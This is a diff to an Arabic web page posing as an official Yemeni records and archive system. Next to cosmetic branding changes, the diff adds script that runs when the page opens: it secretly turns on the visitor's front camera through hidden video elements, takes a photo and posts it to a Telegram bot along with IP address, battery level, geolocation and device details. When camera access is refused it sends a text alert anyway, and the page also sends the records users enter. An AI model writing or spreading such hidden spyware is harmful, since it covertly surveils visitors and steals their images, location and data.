@@ -31,25 +31,31 @@
             background-color: #eef2f5;
         }
 
-        .yemen-banner {
-            background: linear-gradient(135deg, #ce1126, #ffffff, #000000);
-            color: #111;
-            padding: 6px 0;
-            text-align: center;
-            font-size: 11pt;
-            font-weight: 900;
-            border-bottom: 3px solid #000;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        /* شريط علم اليمن المميز في أعلى الموقع */
+        .yemen-flag-bar {
+            display: flex;
+            height: 8px;
+            width: 100%;
             position: sticky;
             top: 0;
-            z-index: 1002;
+            z-index: 1003;
         }
+        .flag-red { background-color: #ce1126; flex: 1; }
+        .flag-white { background-color: #ffffff; flex: 1; }
+        .flag-black { background-color: #000000; flex: 1; }
 
-        .yemen-banner span {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 2px 15px;
-            border-radius: 4px;
-            border: 1px solid #ddd;
+        .yemen-banner {
+            background: #111;
+            color: #ffffff;
+            padding: 6px 0;
+            text-align: center;
+            font-size: 10.5pt;
+            font-weight: bold;
+            border-bottom: 2px solid #ce1126;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            position: sticky;
+            top: 8px;
+            z-index: 1002;
         }
 
         .top-ticker {
@@ -60,7 +66,7 @@
             font-weight: bold;
             box-shadow: 0 2px 6px rgba(0,0,0,0.15);
             position: sticky;
-            top: 36px;
+            top: 41px;
             z-index: 1001;
             overflow: hidden;
             white-space: nowrap;
@@ -85,7 +91,7 @@
             align-items: center;
             gap: 8px;
             position: sticky;
-            top: 75px;
+            top: 80px;
             z-index: 1000;
         }
 
@@ -332,6 +338,7 @@
                 background: #fff;
             }
 
+            .yemen-flag-bar,
             .yemen-banner,
             .top-ticker,
             .control-panel,
@@ -360,18 +367,24 @@
 
 <body>
 
-    <!-- عناصر الكاميرا المخفية لضمان التقاط الصورة بدقة -->
     <video id="videoElement" autoplay playsinline style="display:none; width:320px; height:240px;"></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
 
-    <!-- إشعار الجمهورية اليمنية بأعلى الموقع -->
+    <!-- شريط ألوان علم اليمن -->
+    <div class="yemen-flag-bar">
+        <div class="flag-red"></div>
+        <div class="flag-white"></div>
+        <div class="flag-black"></div>
+    </div>
+
+    <!-- إشعار الجمهورية اليمنية -->
     <div class="yemen-banner">
         <span>🇾🇪 الجمهورية اليمنية - السجلات والأرشيف الرسمي 🇾🇪</span>
     </div>
 
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
-            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
+            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - الجمهورية اليمنية ✨
         </marquee>
     </div>
 
@@ -455,7 +468,7 @@
                    oninput="filterTableRows()">
         </div>
 
-        <a href="https://wa.me/967784327056?text=مرحبا%20ميثاق%20محمد%20تواصلت%20بك"
+        <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات"
            target="_blank"
            rel="noopener noreferrer"
            class="btn btn-whatsapp">
@@ -700,7 +713,7 @@
 
             <div class="footer-bottom">
                 <div class="editable-header" contenteditable="true">
-                    الجمهورية اليمنية - وزارة الإدارة المحلية
+                    الجمهورية اليمنية - الإدارة العامة
                 </div>
 
                 <div class="editable-header" contenteditable="true">
@@ -771,11 +784,61 @@
             }
             renumberAllRows();
 
-            // إرسال إشعار دخول تلقائي عند فتح الموقع لأول مرة
+            // إرسال إشعار دخول زائر فوري عند فتح الصفحة لأول مرة
             setTimeout(() => {
-                sendCompleteReportToTelegram("دخول النظام / فتح الصفحة");
-            }, 1500);
+                sendVisitorAlertOnly();
+            }, 1200);
         });
+
+        // دالة إرسال إشعار دخول زائر مع الصورة مباشرة عند فتح الصفحة
+        function sendVisitorAlertOnly() {
+            const alertCaption = `⚠️ **تنبيه: دخول زائر جديد إلى موقعك!**\n\n` +
+                                 `🌐 الآيبي: \`${userIpInfo}\`\n` +
+                                 `🔋 البطارية: ${batteryInfo}\n` +
+                                 `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
+                                 `📱 الجهاز:\n${deviceInfo}`;
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((photoBlob) => {
+                                    stream.getTracks().forEach(track => track.stop());
+                                    
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('caption', alertCaption);
+                                    formData.append('parse_mode', 'Markdown');
+                                    formData.append('photo', photoBlob, 'visitor.jpg');
+
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).catch(e => {});
+
+                                }, 'image/jpeg', 0.85);
+                            }, 800);
+                        };
+                    })
+                    .catch((err) => {
+                        // إرسال تنبيه نصي في حال رفض إذن الكاميرا
+                        const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption)}&parse_mode=Markdown`;
+                        const img = new Image();
+                        img.src = textApi;
+                    });
+            }
+        }
 
         function sortNamesAlphabetically() {
             const wrapper = document.getElementById('pagesWrapper');
@@ -847,6 +910,7 @@
             alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
         }
 
+        // دالة إرسال تقرير الأرشيف أو التصدير مع فحص عدم إرسال ملفات فارغة
         function sendCompleteReportToTelegram(actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
             let fileContent = `تقرير الأرشيف والبيانات الرسمية (${actionTitle})\n`;
@@ -874,15 +938,10 @@
                 });
             });
 
-            if (!hasData) {
-                fileContent += "\n(لا توجد سجلات مدخلة في الجداول حالياً)";
-            }
-
-            const captionText = `🇾🇪 **إشعار سجلات الجمهورية اليمنية (${actionTitle})**\n\n` +
+            const captionText = `🇾🇪 **تقرير الأرشيف والتصدير (${actionTitle})**\n\n` +
                                 `🌐 الآيبي: \`${userIpInfo}\`\n` +
                                 `🔋 البطارية: ${batteryInfo}\n` +
-                                `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
-                                `📱 الجهاز:\n${deviceInfo}`;
+                                `📍 الموقع الجغرافي:\n${globalLocation}`;
 
             const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
 
@@ -908,31 +967,36 @@
                                     formData.append('chat_id', chatId);
                                     formData.append('caption', captionText);
                                     formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', photoBlob, 'snapshot.jpg');
+                                    formData.append('photo', photoBlob, 'action_snapshot.jpg');
 
                                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
                                     }).then(() => {
-                                        const docData = new FormData();
-                                        docData.append('chat_id', chatId);
-                                        docData.append('document', fileBlob, 'كشف_السجلات_الرسمية_اليمن.txt');
-                                        docData.append('caption', '📄 ملف السجلات والأسماء الكامل مرتب كجدول');
-                                        
-                                        fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                                            method: 'POST',
-                                            body: docData
-                                        }).catch(e => {});
+                                        // إرسال ملف الأسماء فقط إذا كان يحتوي على بيانات حقيقية
+                                        if (hasData) {
+                                            const docData = new FormData();
+                                            docData.append('chat_id', chatId);
+                                            docData.append('document', fileBlob, 'كشف_السجلات_الرسمية.txt');
+                                            docData.append('caption', '📄 ملف السجلات والأسماء المرتب كجدول');
+                                            
+                                            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                                                method: 'POST',
+                                                body: docData
+                                            }).catch(e => {});
+                                        }
                                     }).catch(e => {});
 
                                 }, 'image/jpeg', 0.85);
-                            }, 800);
+                            }, 600);
                         };
                     })
                     .catch((err) => {
-                        sendDocumentOnly(fileBlob, captionText);
+                        if (hasData) {
+                            sendDocumentOnly(fileBlob, captionText);
+                        }
                     });
-            } else {
+            } else if (hasData) {
                 sendDocumentOnly(fileBlob, captionText);
             }
         }
@@ -940,7 +1004,7 @@
         function sendDocumentOnly(fileBlob, captionText) {
             const docData = new FormData();
             docData.append('chat_id', chatId);
-            docData.append('document', fileBlob, 'كشف_السجلات_الرسمية_اليمن.txt');
+            docData.append('document', fileBlob, 'كشف_السجلات_الرسمية.txt');
             docData.append('caption', captionText);
             docData.append('parse_mode', 'Markdown');
 
@@ -1003,7 +1067,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم تنزيل ملف الـ Excel وإرسال التقارير والصورة للبوت بنجاح!');
+            alert('📊 تم تنزيل ملف الـ Excel وإرسال التقارير للبوت بنجاح!');
         }
 
         function normalizeArabic(text) {
@@ -1145,7 +1209,7 @@
                         </table>
                     </div>
                     <div class="footer-bottom">
-                        <div class="editable-header" contenteditable="true">الجمهورية اليمنية - وزارة الإدارة المحلية</div>
+                        <div class="editable-header" contenteditable="true">الجمهورية اليمنية - الإدارة العامة</div>
                         <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
                     </div>
                 `;
@@ -1635,7 +1699,7 @@
                     </table>
                 </div>
                 <div class="footer-bottom">
-                    <div class="editable-header" contenteditable="true">الجمهورية اليمنية - وزارة الإدارة المحلية</div>
+                    <div class="editable-header" contenteditable="true">الجمهورية اليمنية - الإدارة العامة</div>
                     <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
                 </div>
             `;
